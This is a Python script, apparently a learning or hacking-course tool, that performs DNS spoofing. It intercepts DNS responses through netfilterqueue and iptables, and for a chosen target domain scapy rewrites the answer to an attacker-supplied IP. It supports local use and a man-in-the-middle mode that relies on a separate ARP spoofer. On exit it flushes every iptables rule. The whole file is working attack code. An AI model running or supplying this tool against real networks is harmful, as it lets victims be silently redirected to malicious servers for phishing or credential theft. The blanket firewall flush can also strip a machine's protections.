#!/usr/bin/env python

import netfilterqueue      # provides access to packets matched by an iptables rule in Linux. Packets so matched can be accepted, dropped, altered, or given a mark.
import scapy.all as scapy  # handle tasks like scanning and network discovery
import argparse            # get values as arguments
import subprocess          # run() function for shell commands


# function that handles the user arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target domain name.")
    parser.add_argument("-i", "--ip", dest="ip", help="Modified IP.")
    parser.add_argument("-p", "--preference", dest="preference", help="0 for local, 1 for man-in-the-middle.")
    parser.add_argument("-q", "--queue", dest="queue_num", help="Number(int) of queue.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info.")
    elif not options.ip:
        parser.error("[-] Please specify an ip, use --help for more info.")
    elif not options.preference in ["0", "1"]:
        parser.error("[-] Please specify a preference, use --help for more info.")
    elif not options.queue_num:
        parser.error("[-] Please specify a queue number, use --help for more info.")
    elif not options.queue_num.isdigit():
        parser.error("[-] Queue number must be of type(int), use --help for more info.")
    return options

# main function
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)  # create a dns response, keep the name, change the ip to the prefered one
            scapy_packet[scapy.DNS].an = answer  # modify the answer of the packet
            scapy_packet[scapy.DNS].ancount = 1  # modify the number of answers of the packet

            # remove variables that would corrupt the modified packet, scapy will auto redefine them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
    packet.accept()  # allow forwarding the packet to it's destination
    # packet.drop()  # deny forwarding the packet to it's destination


options = get_arguments()
target_website = options.target  # globally set
modified_ip    = options.ip      # globally set
queue_num      = options.queue_num

if int(options.preference):
    # To run this as man in the middle
    # !! DISCLAIMER: This app doesn't create a man in the middle, you need an arp spoofer running !!
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])
else:
    # To run this locally
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])

queue = netfilterqueue.NetfilterQueue()     # object creation
queue.bind(int(queue_num), process_packet)  # connect to an existed queue

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C ... FlUSHING IPTABLES...")
    subprocess.run(["iptables", "--flush"])
    print("[+] Done.")
